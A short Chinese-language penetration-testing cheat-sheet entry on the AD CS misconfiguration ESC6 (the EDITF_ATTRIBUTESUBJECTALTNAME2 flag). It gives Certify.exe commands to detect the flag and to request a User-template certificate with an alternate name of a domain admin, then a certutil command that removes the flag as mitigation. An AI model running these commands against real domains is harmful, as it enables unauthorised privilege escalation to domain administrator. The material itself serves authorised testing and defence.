# Active Directory - 证书 ESC6

## ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2

> 如果在 CA 上设置了此标志，任何请求（包括从 Active Directory 构建主体的请求）都可以在主体备用名称中包含用户自定义值。

**利用方法**

* 使用 [Certify.exe](https://github.com/GhostPack/Certify) 检查 `EDITF_ATTRIBUTESUBJECTALTNAME2` 标志对应的 **UserSpecifiedSAN** 标志状态。

    ```ps1
    Certify.exe cas
    ```

* 为模板请求证书并添加 altname，即使默认的 `User` 模板通常不允许指定备用名称

    ```ps1
    .\Certify.exe request /ca:dc.domain.local\domain-DC-CA /template:User /altname:DomAdmin
    ```

**缓解措施**

* 移除该标志：`certutil.exe -config "CA01.domain.local\CA01" -setreg "policy\EditFlags" -EDITF_ATTRIBUTESUBJECTALTNAME2`

## 参考资料

* [AD CS: from ManageCA to RCE - February 11, 2022 - Pablo Martínez, Kurosh Dabbagh](https://web.archive.org/web/20220212053945/http://www.blackarrow.net/ad-cs-from-manageca-to-rce//)
